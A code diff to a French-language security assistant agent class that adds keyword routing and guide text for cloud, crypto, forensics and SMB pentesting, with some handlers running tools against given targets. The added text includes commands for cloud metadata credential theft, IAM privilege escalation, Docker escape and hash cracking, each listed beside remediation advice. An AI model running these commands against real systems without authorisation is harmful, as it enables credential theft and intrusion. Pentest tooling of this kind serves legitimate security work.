@@ -20,7 +20,7 @@ from core.tools.offensive_engine import offensive
 # ── Mots-clés de déclenchement par catégorie ─────────────────────────────────
 _TRIGGER_MAP = {
     "recon": [
-        "scan", "nmap", "masscan", "rustscan", "port", "ports", "réseau", "network",
+        "scan", "nmap", "masscan", "rustscan", "port scan", "ports ouverts", "réseau", "network",
         "hôte", "host", "ping", "arp", "netdiscover", "découverte",
         "dns", "dnsenum", "dnsrecon", "fierce", "amass", "sublist3r", "subfinder",
         "sous-domaine", "subdomain", "whois", "theharvester", "osint",
@@ -29,10 +29,10 @@ _TRIGGER_MAP = {
     "web": [
         "nikto", "gobuster", "dirb", "ffuf", "wfuzz", "dirsearch",
         "web", "http", "https", "répertoire", "directory", "fuzz",
-        "sqlmap", "injection", "sql", "wpscan", "wordpress",
+        "sqlmap", "sql injection", "wpscan", "wordpress",
         "whatweb", "wafw00f", "vhost", "virtualhost",
         "burp", "burpsuite", "proxy web", "intercepter requête",
-        "zap", "zaproxy", "owasp", "scanner web",
+        "zap", "zaproxy", "owasp zap", "scanner web",
     ],
     "passwords": [
         "hydra", "medusa", "hashcat", "john", "brute", "bruteforce", "crack",
@@ -79,7 +79,71 @@ _TRIGGER_MAP = {
     ],
     "smb": [
         "smb", "smbclient", "smbmap", "enum4linux", "rpcclient",
-        "active directory", "ad", "ldap", "ntlm", "domain", "domaine",
+        "active directory", "ldap", "ntlm", "domain", "domaine",
+    ],
+    "cloud": [
+        "aws", "amazon", "azure", "gcp", "google cloud", "s3", "ec2", "iam",
+        "lambda", "cloudtrail", "cloudwatch", "pacu", "scoutsuite", "prowler",
+        "cloud security", "sécurité cloud", "bucket", "rôle iam", "sts",
+        "cloudformation", "terraform", "kubernetes", "k8s", "docker", "conteneur",
+        "ecr", "eks", "ecs", "blob", "storage account", "key vault",
+    ],
+    "crypto": [
+        "chiffrement", "chiffrer", "déchiffrer", "cryptographie", "cryptography",
+        "aes", "rsa", "ecc", "des", "3des", "chacha20", "salsa",
+        "hash", "sha", "sha256", "sha512", "md5", "bcrypt", "argon2", "pbkdf2",
+        "clé symétrique", "clé asymétrique", "clé privée", "clé publique",
+        "certificat tls", "tls", "ssl", "pki", "x509", "openssl", "gpg",
+        "signature numérique", "hmac", "mac", "nonce", "iv", "padding oracle",
+        "xor cipher", "vigenere", "caesar", "rot13", "base64", "encode", "decode",
+        "entropy", "entropie", "random", "prng", "csprng",
+    ],
+    "governance": [
+        "iso 27001", "iso27001", "nist", "pci dss", "pcidss", "rgpd", "gdpr",
+        "conformité", "compliance", "politique sécurité", "security policy",
+        "risk management", "gestion des risques", "audit", "pentest report",
+        "rapport pentest", "vulnerability assessment", "évaluation de risques",
+        "cvss", "cvss score", "remediation plan", "plan de remédiation",
+        "soc 2", "hipaa", "cis benchmark", "cis controls", "mitre att&ck",
+        "maturity model", "modèle de maturité", "bcp", "drp", "pra", "pca",
+    ],
+    "report": [
+        "rapport de pentest", "pentest report", "rédiger rapport", "écrire rapport",
+        "executive summary", "résumé exécutif", "findings", "recommandations rapport",
+        "rapport de sécurité", "rapport d'audit", "debriefing", "restitution",
+        "template rapport", "rapport technique", "rapport managérial",
+        "cvss calculer", "scoring vulnérabilité", "proof of concept",
+        "remédiation", "plan de remédiation", "fiche vulnérabilité",
+        "rapport pentest", "structure rapport", "plan rapport",
+    ],
+    "os_admin": [
+        "gestion des processus", "gestion processus", "services linux", "services windows",
+        "journalisation", "logs système", "syslog", "journald", "event viewer",
+        "permissions fichier", "chmod", "acl", "selinux", "apparmor",
+        "systemd", "service", "cron", "crontab", "task scheduler",
+        "gestion mémoire", "swap", "ulimit", "limits",
+        "hardening", "durcissement", "cis", "benchmark", "baseline",
+        "patch management", "gestion patches", "mises à jour", "updates",
+        "utilisateurs linux", "users management", "sudo", "sudoers",
+        "audit linux", "auditd", "aide", "tripwire", "intégrité fichiers",
+        "macos security", "sécurité macos", "gatekeeper", "xprotect",
+        "windows hardening", "durcissement windows", "gpo", "group policy",
+        "registry", "registre windows", "bitlocker", "defender",
+        "windows event", "event viewer", "event log", "powershell sécurité",
+        "linux logs", "linux processus", "linux services", "linux permissions",
+    ],
+    "dev_secure": [
+        "owasp", "owasp top 10", "injection sql", "sql injection", "xss", "csrf", "ssrf",
+        "broken authentication", "insecure deserialization", "xxe", "idor",
+        "sécurité api", "api security", "jwt", "jwt attack", "jwt vulnérabilité",
+        "revue de code", "code review", "sast", "dast", "iast", "sonarqube",
+        "semgrep", "bandit", "snyk", "veracode", "checkmarx",
+        "secure coding", "développement sécurisé", "secure sdlc",
+        "dependency confusion", "supply chain", "cve dépendance",
+        "secret scanning", "leak credentials", "trufflehog", "gitleaks",
+        "cors", "csp", "headers sécurité", "security headers", "hsts",
+        "rate limiting", "brute force protection", "captcha",
+        "oauth", "openid", "saml", "sso vulnérabilité",
     ],
 }
 
@@ -94,7 +158,7 @@ _LEVEL_KEYWORDS = {
         "analyser logiciel", "comprendre système", "analyser binaire", "strings", "fingerprint"],
     2: ["niveau 2", "level 2", "fuzzing", "fuzz", "afl", "afl++", "libfuzzer", "crash",
         "valgrind", "asan", "sanitizer", "0-day", "zeroday", "bug mémoire", "overflow",
-        "use after free", "uaf", "static analysis", "semgrep", "bandit", "cppcheck"],
+        "use after free", "uaf", "static analysis", "cppcheck"],
     3: ["niveau 3", "level 3", "exploitation", "privesc", "privilege escalation",
         "élévation de privilèges", "linpeas", "suid", "ret2libc", "rop chain",
         "buffer overflow", "shellcode", "pwntools", "heap spray", "rce", "remote code"],
@@ -123,10 +187,27 @@ class CyberAgent(BaseAgent):
                 return True
         return False
 
+    # Mots-clés exclusifs à dev_secure/report — prioritaires sur _dispatch_level
+    _DEV_SECURE_PRIORITY = {"owasp", "sast", "dast", "xss", "csrf", "ssrf", "idor",
+                             "jwt", "cors", "csp", "hsts", "semgrep", "snyk", "bandit",
+                             "supply chain", "dependency confusion", "trufflehog", "gitleaks",
+                             "code review", "revue de code", "owasp top 10", "injection sql",
+                             "sql injection", "api security", "sécurité api"}
+    _REPORT_PRIORITY = {"executive summary", "résumé exécutif", "template rapport",
+                        "rapport de pentest", "plan rapport", "findings",
+                        "remédiation", "plan de remédiation", "fiche vulnérabilité",
+                        "rapport pentest", "structure rapport"}
+
     async def run(self, task: str, context: Optional[dict] = None) -> dict:
         t = task.lower().strip()
 
-        # 0. Niveaux offensifs explicites
+        # 0a. Priorité dev_secure et report (avant dispatch niveaux)
+        if any(kw in t for kw in self._DEV_SECURE_PRIORITY):
+            return self._handle_dev_secure(task)
+        if any(kw in t for kw in self._REPORT_PRIORITY):
+            return self._handle_report(task)
+
+        # 0b. Niveaux offensifs explicites
         level_result = self._dispatch_level(task, t)
         if level_result is not None:
             return level_result
@@ -160,6 +241,18 @@ class CyberAgent(BaseAgent):
             return self._handle_wireless(task)
         elif category == "smb":
             return self._handle_smb(task)
+        elif category == "cloud":
+            return self._handle_cloud(task)
+        elif category == "crypto":
+            return self._handle_crypto(task)
+        elif category == "governance":
+            return self._handle_governance(task)
+        elif category == "report":
+            return self._handle_report(task)
+        elif category == "os_admin":
+            return self._handle_os_admin(task)
+        elif category == "dev_secure":
+            return self._handle_dev_secure(task)
 
         # 4. Catalogue
         if any(kw in t for kw in ["liste", "list", "catalogue", "quels outils", "what tools", "available"]):
@@ -1165,7 +1258,20 @@ class CyberAgent(BaseAgent):
 
         if any(kw in t for kw in ["volatility", "volatility3", "memory", "mémoire"]):
             if not file_path:
-                return self._result(False, "Spécifie le dump mémoire. Ex: volatility3 -f memory.dmp windows.pslist")
+                return self._result(True,
+                    "🔍 Volatility3 — Analyse de dump mémoire\n\n"
+                    "Plugins Windows essentiels :\n"
+                    "  volatility3 -f memory.dmp windows.info          → infos système\n"
+                    "  volatility3 -f memory.dmp windows.pslist         → processus\n"
+                    "  volatility3 -f memory.dmp windows.pstree         → arbre processus\n"
+                    "  volatility3 -f memory.dmp windows.netstat        → connexions réseau\n"
+                    "  volatility3 -f memory.dmp windows.hashdump       → hashes NT\n"
+                    "  volatility3 -f memory.dmp windows.cmdline        → lignes de commande\n"
+                    "  volatility3 -f memory.dmp windows.malfind        → injection de code\n\n"
+                    "Plugins Linux :\n"
+                    "  volatility3 -f memory.dmp linux.pslist\n"
+                    "  volatility3 -f memory.dmp linux.bash             → historique bash\n\n"
+                    "Spécifie le fichier .dmp pour lancer directement.")
             cmd = f"volatility3 -f {file_path} windows.info"
             return self._run_command(cmd, task)
 
@@ -1179,7 +1285,14 @@ class CyberAgent(BaseAgent):
                 return self._result(False, "Spécifie le firmware/fichier.")
             return self._run_command(f"binwalk {file_path}", task)
 
-        return self._result(False, "Précise l'outil forensics (volatility3/exiftool/binwalk/foremost).")
+        return self._result(True,
+            "🔍 FORENSICS — Guide d'investigation\n\n"
+            "  volatility3 -f memory.dmp windows.pslist  → analyse mémoire\n"
+            "  exiftool <fichier>                        → métadonnées\n"
+            "  binwalk <firmware>                        → analyse firmware\n"
+            "  foremost -i disk.img -o output/           → carving fichiers\n"
+            "  steghide extract -sf image.jpg            → stéganographie\n\n"
+            "Précise le fichier/dump à analyser.")
 
     def _handle_wireless(self, task: str) -> dict:
         t = task.lower()
@@ -1276,7 +1389,16 @@ class CyberAgent(BaseAgent):
                 return self._result(False, "Spécifie la cible.")
             return self._run_command(f"smbmap -H {target}", task)
 
-        return self._result(False, "Précise l'outil SMB (enum4linux/smbmap/smbclient/crackmapexec).")
+        if not target:
+            return self._result(True,
+                "🗂️  SMB / Active Directory — Guide\n\n"
+                "  enum4linux -a <IP>                    → énumération SMB complète\n"
+                "  smbmap -H <IP>                        → lister les shares\n"
+                "  smbclient -L //<IP>/ -N               → shares anonymes\n"
+                "  crackmapexec smb <IP> -u '' -p ''     → accès anonyme\n"
+                "  rpcclient -U '' -N <IP>               → enum RPC\n\n"
+                "Précise l'IP cible pour lancer directement.")
+        return self._run_command(f"enum4linux -a {target}", task)
 
     # ── Exploit engine (sans shell) ───────────────────────────────────────────
 
@@ -1415,6 +1537,1158 @@ class CyberAgent(BaseAgent):
             icon = icons.get(val, "?")
             lines.append(f"  {icon} {key:8} : {val}")
         return "\n".join(lines)
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 7 — SÉCURITÉ CLOUD (AWS / Azure / GCP)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_cloud(self, task: str) -> dict:
+        t = task.lower()
+        target = self._extract_target(task)
+
+        # ── AWS ───────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["aws", "amazon", "s3", "ec2", "lambda", "iam", "cloudtrail", "pacu"]):
+            if "pacu" in t:
+                return self._result(True,
+                    "☁️  AWS — Pacu (framework pentest AWS)\n\n"
+                    "Installation :\n"
+                    "  pip3 install pacu\n"
+                    "  pacu\n\n"
+                    "Modules essentiels :\n"
+                    "  run iam__enum_users_roles_policies_groups  → enum IAM\n"
+                    "  run ec2__enum                              → enum EC2\n"
+                    "  run s3__enum                               → lister S3\n"
+                    "  run iam__privesc_scan                      → privesc IAM\n"
+                    "  run lambda__enum                           → enum Lambda\n\n"
+                    "Checklist pentest AWS :\n"
+                    "  1. Récupérer les clés via metadata : curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+                    "  2. Configurer : aws configure\n"
+                    "  3. Enum IAM  : aws iam get-account-authorization-details\n"
+                    "  4. Enum S3   : aws s3 ls\n"
+                    "  5. Trouver privesc : pacu → iam__privesc_scan",
+                    {"tool": "pacu", "domain": "cloud"})
+
+            if "scoutsuite" in t or "scout" in t:
+                return self._result(True,
+                    "☁️  ScoutSuite — Audit multi-cloud\n\n"
+                    "Installation : pip3 install scoutsuite\n\n"
+                    "Audit AWS  : scout aws\n"
+                    "Audit Azure: scout azure --cli\n"
+                    "Audit GCP  : scout gcp --user-account\n\n"
+                    "Rapport HTML généré dans scoutsuite-report/\n"
+                    "Checks : IAM, S3 public, CloudTrail désactivé, Security Groups 0.0.0.0/0, MFA, rotation clés",
+                    {"tool": "scoutsuite"})
+
+            if "prowler" in t:
+                return self._result(True,
+                    "☁️  Prowler — Audit sécurité AWS/Azure/GCP\n\n"
+                    "Installation : pip3 install prowler\n\n"
+                    "AWS complet  : prowler aws\n"
+                    "CIS Benchmark: prowler aws --compliance cis_1.4_aws\n"
+                    "GDPR check   : prowler aws --compliance gdpr_aws\n"
+                    "Azure        : prowler azure --sp-env-auth\n\n"
+                    "Checks critiques : MFA root, CloudTrail actif, S3 Block Public Access, IAM password policy",
+                    {"tool": "prowler"})
+
+            if "s3" in t:
+                bucket = re.search(r'\b([a-z0-9][a-z0-9\-\.]{1,61}[a-z0-9])\b', task)
+                if bucket and any(kw in t for kw in ["enum", "list", "scan", "public"]):
+                    b = bucket.group(1)
+                    return self._result(True,
+                        f"☁️  S3 Bucket : {b}\n\n"
+                        f"Accès public  : curl -s https://{b}.s3.amazonaws.com/ | head -20\n"
+                        f"Via AWS CLI   : aws s3 ls s3://{b} --no-sign-request\n"
+                        f"Télécharger   : aws s3 cp s3://{b}/ /tmp/{b}/ --recursive --no-sign-request\n\n"
+                        "Scan automatique :\n"
+                        "  trufflehog s3 --bucket {b}    (chercher secrets)\n"
+                        "  grayhatwarfare.com            (moteur buckets publics)",
+                        {"bucket": b})
+                return self._result(True,
+                    "☁️  AWS S3 — Sécurité\n\n"
+                    "Vérifier bucket public :\n"
+                    "  aws s3api get-bucket-acl --bucket <nom>\n"
+                    "  aws s3api get-bucket-policy --bucket <nom>\n"
+                    "  aws s3api get-public-access-block --bucket <nom>\n\n"
+                    "Lister tous les buckets :\n"
+                    "  aws s3 ls\n\n"
+                    "Chercher des secrets dans un bucket :\n"
+                    "  trufflehog s3 --bucket <nom>\n\n"
+                    "Bloquer l'accès public (remédiation) :\n"
+                    "  aws s3api put-public-access-block --bucket <nom> \\\n"
+                    "    --public-access-block-configuration BlockPublicAcls=true,RestrictPublicBuckets=true",
+                    {"domain": "cloud", "service": "s3"})
+
+            # Metadata SSRF sur EC2
+            if any(kw in t for kw in ["metadata", "imds", "169.254"]):
+                return self._result(True,
+                    "☁️  AWS Instance Metadata — SSRF / Credential Theft\n\n"
+                    "Depuis l'instance :\n"
+                    "  curl http://169.254.169.254/latest/meta-data/\n"
+                    "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+                    "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n"
+                    "Via SSRF (IMDSv1 vulnérable) :\n"
+                    "  Injecter URL : http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+                    "  → Récupère AccessKeyId, SecretAccessKey, Token\n\n"
+                    "Remédiation : activer IMDSv2 (token requis)\n"
+                    "  aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required",
+                    {"domain": "cloud", "attack": "ssrf_metadata"})
+
+            return self._result(True,
+                "☁️  AWS Security — Checklist pentest\n\n"
+                "1. RECONNAISSANCE\n"
+                "   aws iam get-user                              → utilisateur courant\n"
+                "   aws iam list-users                            → tous les users\n"
+                "   aws iam list-roles                            → tous les rôles\n"
+                "   aws iam list-attached-user-policies --user-name <u>\n"
+                "   aws sts get-caller-identity                   → compte courant\n\n"
+                "2. PRIVESC IAM\n"
+                "   aws iam create-access-key --user-name <user>\n"
+                "   aws iam attach-user-policy --user-name <u> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
+                "   iam__privesc_scan (Pacu)\n\n"
+                "3. LATÉRAL\n"
+                "   aws lambda list-functions                     → fonctions Lambda\n"
+                "   aws ec2 describe-instances                    → instances EC2\n"
+                "   aws secretsmanager list-secrets               → secrets\n\n"
+                "4. OUTILS\n"
+                "   pacu        → framework exploit AWS\n"
+                "   scoutsuite  → audit complet\n"
+                "   prowler     → compliance CIS/GDPR",
+                {"domain": "cloud", "provider": "aws"})
+
+        # ── Azure ─────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["azure", "blob", "key vault", "entra"]):
+            return self._result(True,
+                "☁️  Azure Security — Checklist pentest\n\n"
+                "OUTILS :\n"
+                "  az login                     → authentification Azure CLI\n"
+                "  MicroBurst (PowerShell)       → enum Azure\n"
+                "  ROADtools                     → enum Azure AD\n"
+                "  Stormspotter                  → graphe Azure AD\n\n"
+                "ENUM :\n"
+                "  az account list              → abonnements\n"
+                "  az ad user list              → utilisateurs AAD\n"
+                "  az role assignment list      → attributions de rôles\n"
+                "  az keyvault list             → Key Vaults\n"
+                "  az storage account list      → comptes stockage\n\n"
+                "ATTAQUES CLASSIQUES :\n"
+                "  Password spray AAD : MSOLSpray, Ruler\n"
+                "  Phishing OAuth     : 365-Stealer (device code flow)\n"
+                "  Blob public        : az storage blob list --account-name <n> --container <c>\n"
+                "  SSRF sur VM        : curl http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n"
+                "REMÉDIATION :\n"
+                "  Activer MFA + Conditional Access\n"
+                "  PIM (Privileged Identity Management)\n"
+                "  Defender for Cloud",
+                {"domain": "cloud", "provider": "azure"})
+
+        # ── GCP ───────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["gcp", "google cloud"]):
+            return self._result(True,
+                "☁️  GCP Security — Checklist pentest\n\n"
+                "OUTILS :\n"
+                "  gcloud auth login            → authentification\n"
+                "  GCP Scanner (GitHub)         → audit automatique\n"
+                "  Cartography                  → graphe infra GCP\n\n"
+                "ENUM :\n"
+                "  gcloud projects list\n"
+                "  gcloud iam list-grantable-roles --resource //cloudresourcemanager.googleapis.com/projects/<id>\n"
+                "  gcloud storage buckets list\n"
+                "  gcloud compute instances list\n"
+                "  gcloud secrets list\n\n"
+                "ATTAQUES :\n"
+                "  Metadata : curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/\n"
+                "  Service Account key : gcloud iam service-accounts keys list --iam-account <sa>\n"
+                "  Bucket public enum : gsutil ls gs://\n\n"
+                "REMÉDIATION :\n"
+                "  Workload Identity Federation\n"
+                "  VPC Service Controls\n"
+                "  Cloud Armor",
+                {"domain": "cloud", "provider": "gcp"})
+
+        # ── Kubernetes ────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["kubernetes", "k8s", "kubectl", "pod", "conteneur", "docker"]):
+            if any(kw in t for kw in ["docker", "conteneur"]):
+                return self._result(True,
+                    "🐳  Docker / Conteneurs — Sécurité\n\n"
+                    "AUDIT IMAGE :\n"
+                    "  trivy image <nom>                → CVE dans l'image\n"
+                    "  docker scan <nom>                → Snyk scan\n"
+                    "  dive <nom>                       → analyser layers\n\n"
+                    "ÉVASION CONTENEUR :\n"
+                    "  # Vérifier si dans conteneur\n"
+                    "  cat /proc/1/cgroup | grep docker\n"
+                    "  ls /.dockerenv\n\n"
+                    "  # Escape via --privileged\n"
+                    "  mount /dev/sda1 /mnt && chroot /mnt\n\n"
+                    "  # Escape via socket Docker\n"
+                    "  ls /var/run/docker.sock\n"
+                    "  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n\n"
+                    "BONNES PRATIQUES :\n"
+                    "  Exécuter non-root (USER 1000)\n"
+                    "  Read-only filesystem\n"
+                    "  Capabilities drop (--cap-drop ALL)\n"
+                    "  Seccomp profiles\n"
+                    "  Image signée (Docker Content Trust)",
+                    {"domain": "cloud", "tool": "docker"})
+            return self._result(True,
+                "☸️  Kubernetes Security\n\n"
+                "ENUM :\n"
+                "  kubectl get pods --all-namespaces\n"
+                "  kubectl get serviceaccounts --all-namespaces\n"
+                "  kubectl get clusterrolebindings\n"
+                "  kubectl auth can-i --list\n\n"
+                "ATTAQUES :\n"
+                "  # Token dans pod\n"
+                "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
+                "  # RBAC misconfiguration\n"
+                "  kubectl get clusterrolebindings -o json | grep -i cluster-admin\n"
+                "  # Exposed API server\n"
+                "  curl -k https://<API>:6443/api/v1/namespaces/default/pods\n\n"
+                "OUTILS :\n"
+                "  kubeaudit     → audit RBAC\n"
+                "  kube-bench    → CIS Benchmark K8s\n"
+                "  kube-hunter   → pentest K8s\n"
+                "  trivy         → scan images\n\n"
+                "REMÉDIATION : RBAC least privilege, PSP/OPA Gatekeeper, Network Policies",
+                {"domain": "cloud", "tool": "kubernetes"})
+
+        return self._result(True,
+            "☁️  Cloud Security — Domaines couverts\n\n"
+            "  aws          → pentest AWS (Pacu, ScoutSuite, Prowler)\n"
+            "  azure        → pentest Azure (ROADtools, MicroBurst)\n"
+            "  gcp          → pentest GCP (gcloud, Cartography)\n"
+            "  kubernetes   → K8s (kube-hunter, kube-bench, trivy)\n"
+            "  docker       → conteneurs (escape, trivy, dive)\n"
+            "  s3 <bucket>  → audit bucket S3\n"
+            "  metadata     → vol de credentials via SSRF IMDS\n\n"
+            "Précise le provider ou l'outil pour un guide détaillé.",
+            {"domain": "cloud"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 8 — CRYPTOGRAPHIE
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_crypto(self, task: str) -> dict:
+        t = task.lower()
+
+        # ── Opérations OpenSSL ────────────────────────────────────────────────
+        if any(kw in t for kw in ["openssl", "certificat", "tls", "ssl", "x509", "pki"]):
+            if any(kw in t for kw in ["générer", "créer", "generate", "create"]):
+                return self._result(True,
+                    "🔐  OpenSSL — Génération de certificats\n\n"
+                    "Clé RSA 4096 bits :\n"
+                    "  openssl genrsa -out private.key 4096\n\n"
+                    "Certificat auto-signé :\n"
+                    "  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n"
+                    "CSR (Certificate Signing Request) :\n"
+                    "  openssl req -new -key private.key -out request.csr\n\n"
+                    "Clé ECDSA (P-256) :\n"
+                    "  openssl ecparam -name prime256v1 -genkey -noout -out ec.key\n"
+                    "  openssl req -new -x509 -key ec.key -out ec-cert.pem -days 365\n\n"
+                    "Vérifier un certificat :\n"
+                    "  openssl x509 -in cert.pem -text -noout\n"
+                    "  openssl x509 -in cert.pem -noout -dates\n\n"
+                    "Tester TLS d'un serveur :\n"
+                    "  openssl s_client -connect host:443\n"
+                    "  openssl s_client -connect host:443 -tls1_2\n"
+                    "  testssl.sh host:443   (audit complet)",
+                    {"domain": "crypto", "tool": "openssl"})
+            target = self._extract_target(task) or self._extract_url_or_target(task)
+            if target:
+                cmd = f"openssl s_client -connect {target}:443 -brief"
+                return self._run_command(cmd, task)
+            return self._result(True,
+                "🔐  OpenSSL — Commandes essentielles\n\n"
+                "Analyser certificat serveur :\n"
+                "  openssl s_client -connect <host>:443\n"
+                "  openssl s_client -connect <host>:443 </dev/null 2>/dev/null | openssl x509 -noout -text\n\n"
+                "Hasher un fichier :\n"
+                "  openssl dgst -sha256 fichier.txt\n"
+                "  openssl dgst -md5 fichier.txt\n\n"
+                "Chiffrer/déchiffrer AES-256 :\n"
+                "  openssl enc -aes-256-cbc -salt -in plain.txt -out cipher.bin -k 'motdepasse'\n"
+                "  openssl enc -d -aes-256-cbc -in cipher.bin -out plain.txt -k 'motdepasse'\n\n"
+                "Générer un nonce/clé aléatoire :\n"
+                "  openssl rand -hex 32\n"
+                "  openssl rand -base64 32",
+                {"domain": "crypto", "tool": "openssl"})
+
+        # ── Hash / Password ───────────────────────────────────────────────────
+        if any(kw in t for kw in ["sha", "sha256", "sha512", "md5", "bcrypt", "argon2", "pbkdf2", "hmac"]):
+            val = re.search(r'\b([a-fA-F0-9]{32,})\b', task)
+            if val and any(kw in t for kw in ["identifier", "type", "quel", "analyser"]):
+                h = val.group(1)
+                length = len(h)
+                htype = {32: "MD5", 40: "SHA-1", 56: "SHA-224", 64: "SHA-256", 96: "SHA-384", 128: "SHA-512"}.get(length, f"inconnu ({length} chars)")
+                return self._result(True,
+                    f"🔐  Hash identifié : {htype}\n"
+                    f"  Valeur  : {h}\n"
+                    f"  Longueur: {length} caractères ({length * 4} bits)\n\n"
+                    f"Craquer avec hashcat :\n"
+                    f"  Mode : MD5→0, SHA-1→100, SHA-256→1400, SHA-512→1700\n"
+                    f"  Commande : hashcat -m <mode> {h} /usr/share/wordlists/rockyou.txt\n\n"
+                    "Craquer avec john :\n"
+                    f"  echo '{h}' > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n"
+                    "Note : MD5/SHA-1 sont obsolètes. Utiliser SHA-256+ ou bcrypt/Argon2 pour les mots de passe.",
+                    {"hash": h, "type": htype})
+            return self._result(True,
+                "🔐  Cryptographie — Fonctions de hachage\n\n"
+                "Algorithmes et usages recommandés :\n"
+                "  MD5 (128b)    → OBSOLÈTE — ne pas utiliser pour sécu\n"
+                "  SHA-1 (160b)  → OBSOLÈTE — cassé (collisions)\n"
+                "  SHA-256 (256b)→ ✓ Intégrité fichiers, signatures\n"
+                "  SHA-512 (512b)→ ✓ Haute sécurité\n"
+                "  bcrypt        → ✓ Stockage mots de passe (slow hash)\n"
+                "  Argon2id      → ✓ Meilleur pour mots de passe (résistant GPU)\n"
+                "  PBKDF2        → ✓ Dérivation de clé (NIST approuvé)\n\n"
+                "Hasher en Python :\n"
+                "  import hashlib; hashlib.sha256(b'data').hexdigest()\n"
+                "  import bcrypt; bcrypt.hashpw(b'pass', bcrypt.gensalt())\n\n"
+                "Identifier un hash inconnu :\n"
+                "  hash-identifier <hash>   (ou hashid)",
+                {"domain": "crypto"})
+
+        # ── Chiffrement symétrique/asymétrique ────────────────────────────────
+        if any(kw in t for kw in ["aes", "rsa", "ecc", "chiffrement", "chiffrer", "déchiffrer"]):
+            return self._result(True,
+                "🔐  Cryptographie — Chiffrement\n\n"
+                "SYMÉTRIQUE (même clé) :\n"
+                "  AES-256-GCM  → Standard actuel (authentifié)\n"
+                "  AES-256-CBC  → Attention au padding oracle\n"
+                "  ChaCha20-Poly1305 → Mobile/IoT (résistant timing)\n\n"
+                "  Python AES-GCM :\n"
+                "    from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
+                "    key = os.urandom(32)\n"
+                "    nonce = os.urandom(12)\n"
+                "    ct = AESGCM(key).encrypt(nonce, b'data', None)\n\n"
+                "ASYMÉTRIQUE (clé publique/privée) :\n"
+                "  RSA-2048+  → Chiffrement, signatures\n"
+                "  ECDSA P-256→ Signatures (plus court que RSA)\n"
+                "  Ed25519    → Signatures modernes (SSH, TLS 1.3)\n"
+                "  ECDH       → Échange de clé Diffie-Hellman sur courbes\n\n"
+                "  Python RSA :\n"
+                "    from cryptography.hazmat.primitives.asymmetric import rsa, padding\n"
+                "    private = rsa.generate_private_key(65537, 2048)\n"
+                "    ct = private.public_key().encrypt(b'data', padding.OAEP(...))\n\n"
+                "ATTAQUES CLASSIQUES :\n"
+                "  Padding Oracle → AES-CBC sans authentification\n"
+                "  RSA e=3        → Small exponent attack\n"
+                "  Nonce reuse    → AESGCM — catastrophique\n"
+                "  Timing attack  → implémentation non-constant-time",
+                {"domain": "crypto"})
+
+        # ── GPG ───────────────────────────────────────────────────────────────
+        if any(kw in t for kw in ["gpg", "pgp"]):
+            return self._result(True,
+                "🔐  GPG — Chiffrement et signatures\n\n"
+                "Générer une clé :\n"
+                "  gpg --full-generate-key\n\n"
+                "Chiffrer un fichier :\n"
+                "  gpg --encrypt --recipient email@example.com fichier.txt\n"
+                "  gpg --symmetric --cipher-algo AES256 fichier.txt   (avec mot de passe)\n\n"
+                "Déchiffrer :\n"
+                "  gpg --decrypt fichier.txt.gpg\n\n"
+                "Signer :\n"
+                "  gpg --sign fichier.txt           (signature binaire)\n"
+                "  gpg --clearsign fichier.txt       (signature texte)\n"
+                "  gpg --detach-sign fichier.txt     (signature séparée)\n\n"
+                "Vérifier signature :\n"
+                "  gpg --verify fichier.txt.sig fichier.txt\n\n"
+                "Exporter clé publique :\n"
+                "  gpg --armor --export email@example.com",
+                {"domain": "crypto", "tool": "gpg"})
+
+        # ── Attaques crypto CTF ────────────────────────────────────────────────
+        if any(kw in t for kw in ["xor cipher", "vigenere", "caesar", "rot13", "base64", "encode", "decode"]):
+            return self._result(True,
+                "🔐  Crypto CTF — Techniques classiques\n\n"
+                "Base64 :\n"
+                "  echo 'data' | base64\n"
+                "  echo 'ZGF0YQ==' | base64 -d\n"
+                "  python3: import base64; base64.b64decode(s)\n\n"
+                "ROT13 / César :\n"
+                "  echo 'text' | tr 'A-Za-z' 'N-ZA-Mn-za-m'    (rot13)\n"
+                "  python3: codecs.decode('text', 'rot_13')\n\n"
+                "XOR :\n"
+                "  python3: bytes([a ^ b for a, b in zip(ct, key * (len(ct)//len(key)+1))])\n"
+                "  xortool <fichier>    (analyse XOR automatique)\n\n"
+                "Vigenère :\n"
+                "  dcode.fr/chiffre-vigenere   (décryptage en ligne)\n"
+                "  python3 : kasiski_test() pour trouver la longueur de clé\n\n"
+                "Identifier le chiffrement :\n"
+                "  dcode.fr/identification-chiffrement\n"
+                "  cyberchef.io    (Swiss-army knife)\n\n"
+                "Outils CTF :\n"
+                "  pwntools (python) — crypto CTF\n"
+                "  SageMath          — mathématiques crypto\n"
+                "  RsaCtfTool        — attaques RSA automatiques",
+                {"domain": "crypto", "ctf": True})
+
+        return self._result(True,
+            "🔐  Cryptographie — Vue d'ensemble\n\n"
+            "  openssl <host>     → analyser TLS d'un serveur\n"
+            "  openssl générer    → créer clés/certificats\n"
+            "  hash sha256        → fonctions de hachage et recommandations\n"
+            "  aes / rsa / ecc   → chiffrement symétrique/asymétrique\n"
+            "  gpg                → chiffrement et signatures PGP\n"
+            "  xor / base64       → techniques CTF\n"
+            "  <hash_hex>        → identifier et craquer un hash\n\n"
+            "Précise le contexte pour un guide détaillé.",
+            {"domain": "crypto"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 14 — GOUVERNANCE & CONFORMITÉ (ISO 27001, NIST, CVSS)
+    # ══════════════════════════════════════════════════════════════════════════
+
